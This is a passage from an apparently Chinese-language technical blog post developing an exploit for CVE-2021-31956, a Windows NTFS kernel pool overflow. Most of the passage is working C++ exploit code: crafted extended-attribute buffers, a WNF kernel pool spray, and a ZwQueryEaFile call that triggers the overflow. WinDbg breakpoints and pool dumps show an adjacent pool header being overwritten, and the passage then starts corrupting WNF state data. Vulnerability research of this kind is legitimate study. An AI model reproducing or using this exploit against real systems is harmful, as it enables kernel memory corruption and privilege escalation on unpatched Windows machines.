class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    PZwSetEaFile ZwSetEaFile = (PZwSetEaFile)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwSetEaFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwSetEaFile) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to get ZwSetEaFile : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PZwQueryEaFile ZwQueryEaFile = (PZwQueryEaFile)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwQueryEaFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwQueryEaFile) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to get ZwQueryEaFile : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PZwCreateWnfStateName ZwCreateWnfStateName = (PZwCreateWnfStateName)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwCreateWnfStateName&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwCreateWnfStateName) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to get ZwCreateWnfStateName : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PZwUpdateWnfStateData ZwUpdateWnfStateData = (PZwUpdateWnfStateData)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwUpdateWnfStateData&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwUpdateWnfStateData) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to get ZwUpdateWnfStateData : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PZwDeleteWnfStateData ZwDeleteWnfStateData = (PZwDeleteWnfStateData)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwDeleteWnfStateData&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwDeleteWnfStateData) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to get ZwDeleteWnfStateData : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    NTSTATUS status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* filepath = <span class="string">L&quot;C:\\Users\\Ver\\Desktop\\CVE-2021-31956\\test.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    HANDLE fileHandle = <span class="built_in">CreateFile</span>(filepath,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE | DELETE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_ALWAYS,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fileHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to open: &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> setEaBuffer[] = &#123;</span><br><span class="line">        <span class="number">0x10</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// NextEntryOffset</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// Flags</span></span><br><span class="line">        <span class="number">0x05</span>, <span class="comment">// EaNameLength</span></span><br><span class="line">        <span class="number">0x00</span>,<span class="number">0x01</span>, <span class="comment">// EaValueLen</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// name</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// padding</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// padding</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// NextEntryOffset</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// Flags</span></span><br><span class="line">        <span class="number">0x05</span>, <span class="comment">// EaNameLength</span></span><br><span class="line">        <span class="number">0x02</span>,<span class="number">0x00</span>, <span class="comment">// EaValueLen</span></span><br><span class="line">        <span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>, <span class="comment">// name</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// padding</span></span><br><span class="line">        <span class="number">0x68</span>,<span class="number">0x68</span>, <span class="comment">// data</span></span><br><span class="line">    &#125;;</span><br><span class="line">    IO_STATUS_BLOCK setEaIoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    status = <span class="built_in">ZwSetEaFile</span>(fileHandle, (PIO_STATUS_BLOCK)&amp;setEaIoStatusBlock, &amp;setEaBuffer, <span class="built_in">sizeof</span>(setEaBuffer));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to ZwSetEaFile: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> ULONG spraySize = <span class="number">0x10000</span>;</span><br><span class="line">    <span class="type">const</span> ULONG allocSize = <span class="number">0x100</span>;</span><br><span class="line">    <span class="type">char</span> buffer[allocSize] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0x61</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">    WNF_STATE_NAME states[spraySize] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; spraySize; i++) &#123;</span><br><span class="line">        WNF_TYPE_ID id;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;id, <span class="number">0</span>, <span class="built_in">sizeof</span>(id));</span><br><span class="line">        id.TypeId.Data1 = i;</span><br><span class="line"></span><br><span class="line">        WNF_STATE_NAME state;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;state, <span class="number">0</span>, <span class="built_in">sizeof</span>(state));</span><br><span class="line"></span><br><span class="line">        SECURITY_DESCRIPTOR sd;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;sd, <span class="number">0</span>, <span class="built_in">sizeof</span>(sd));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">InitializeSecurityDescriptor</span>(&amp;sd, SECURITY_DESCRIPTOR_REVISION)) &#123;</span><br><span class="line">            DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;failed to InitializeSecurityDescriptor : &quot;</span> &lt;&lt; err;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        status = <span class="built_in">ZwCreateWnfStateName</span>(&amp;state, WnfTemporaryStateName, WnfDataScopeUser, FALSE, &amp;id, <span class="number">0x1000</span>, &amp;sd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0</span>) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;failed to ZwCreateWnfStateName: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        status = <span class="built_in">ZwUpdateWnfStateData</span>(&amp;state, buffer, <span class="built_in">sizeof</span>(buffer), &amp;id, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0</span>) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;failed to ZwUpdateWnfStateData: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        states[i] = state;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    status = <span class="built_in">ZwDeleteWnfStateData</span>(&amp;states[spraySize - <span class="number">0x20</span>], <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to ZwDeleteWnfStateData: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;done!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> eaListBuffer[] = &#123;</span><br><span class="line">        <span class="number">0x0c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// NextEntryOffset</span></span><br><span class="line">        <span class="number">0x05</span>, <span class="comment">// EaNameLength</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x00</span>, <span class="comment">// name</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// padding</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// NextEntryOffset</span></span><br><span class="line">        <span class="number">0x05</span>, <span class="comment">// EaNameLength</span></span><br><span class="line">        <span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x00</span>, <span class="comment">// name</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// padding</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    IO_STATUS_BLOCK queryEaIoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    FILE_FULL_EA_INFORMATION queryEaBuffer = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WORD queryEaBufferLength = <span class="number">0x10e</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;final\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    status = <span class="built_in">ZwQueryEaFile</span>(fileHandle, (PIO_STATUS_BLOCK)&amp;queryEaIoStatusBlock, &amp;queryEaBuffer, queryEaBufferLength, <span class="number">0</span>, &amp;eaListBuffer, <span class="built_in">sizeof</span>(eaListBuffer), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to ZwQueryEaFile: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用如下断点：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp Ntfs!NtfsQueryEaUserEaList <span class="string">&quot;j @r12d = 0x10e &#x27;&#x27;;&#x27;gc&#x27;&quot;</span></span><br><span class="line">bp ntfs!NtfsQueryEaUserEaList + <span class="number">0x1bd</span></span><br></pre></td></tr></table></figure>

<p>发现成功：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !pool @r9</span><br><span class="line">Pool page ffff9f08467b0b90 region is Paged pool</span><br><span class="line"> ffff9f08467b0040 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b0160 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b0280 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b03a0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b04c0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b05e0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b0700 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b0820 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b0940 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b0a60 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line">*ffff9f08467b0b80 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated) *NtFE</span><br><span class="line">		Pooltag NtFE : Ea.c, Binary : ntfs.sys</span><br><span class="line"> ffff9f08467b0ca0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b0dc0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br><span class="line"> ffff9f08467b0ee0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58e029430c0</span><br></pre></td></tr></table></figure>

<p>同时对比 <code>memcpy</code> 前后，可以发现下一个堆块的 <code>POOL_HEADER</code> 已经被覆盖：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dc ffff9f08467b0b80+<span class="number">0x120</span></span><br><span class="line">ffff9f08`<span class="number">467b</span>0ca0  <span class="number">0b1</span>20000 <span class="number">20666e57</span> <span class="number">1</span>a6d370b <span class="number">19684</span>ad3  ....Wnf <span class="number">.7</span>m..Jh.</span><br><span class="line">ffff9f08`<span class="number">467b</span>0cb0  <span class="number">00100904</span> <span class="number">00000100</span> <span class="number">00000100</span> <span class="number">00000001</span>  ................</span><br><span class="line">ffff9f08`<span class="number">467b</span>0cc0  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line">ffff9f08`<span class="number">467b</span>0cd0  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line">ffff9f08`<span class="number">467b</span>0ce0  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line">ffff9f08`<span class="number">467b</span>0cf0  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line">ffff9f08`<span class="number">467b</span>0d00  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line">ffff9f08`<span class="number">467b</span>0d10  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; p</span><br><span class="line">Ntfs!NtfsQueryEaUserEaList+<span class="number">0x1c2</span>:</span><br><span class="line">fffff805`<span class="number">85688b</span>52 <span class="number">41897</span>d00        mov     dword ptr [r13],edi</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dc ffff9f08467b0b80+<span class="number">0x120</span></span><br><span class="line">ffff9f08`<span class="number">467b</span>0ca0  <span class="number">00000010</span> <span class="number">00020500</span> <span class="number">47474747</span> <span class="number">68680047</span>  ........GGGGG.hh</span><br><span class="line">ffff9f08`<span class="number">467b</span>0cb0  <span class="number">00100904</span> <span class="number">00000100</span> <span class="number">00000100</span> <span class="number">00000001</span>  ................</span><br><span class="line">ffff9f08`<span class="number">467b</span>0cc0  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line">ffff9f08`<span class="number">467b</span>0cd0  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line">ffff9f08`<span class="number">467b</span>0ce0  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line">ffff9f08`<span class="number">467b</span>0cf0  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line">ffff9f08`<span class="number">467b</span>0d00  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br><span class="line">ffff9f08`<span class="number">467b</span>0d10  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span>  aaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>

<p>接下来修改下一个块的 <code>_WNF_STATE_DATA</code> ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> setEaBuffer[] = &#123;</span><br><span class="line">        <span class="number">0x10</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// NextEntryOffset</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// Flags</span></span><br><span class="line">        <span class="number">0x05</span>, <span class="comment">// EaNameLength</span></span><br><span class="line">        <span class="number">0x00</span>,<span class="number">0x01</span>, <span class="comment">// EaValueLen</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// name</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// padding</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span 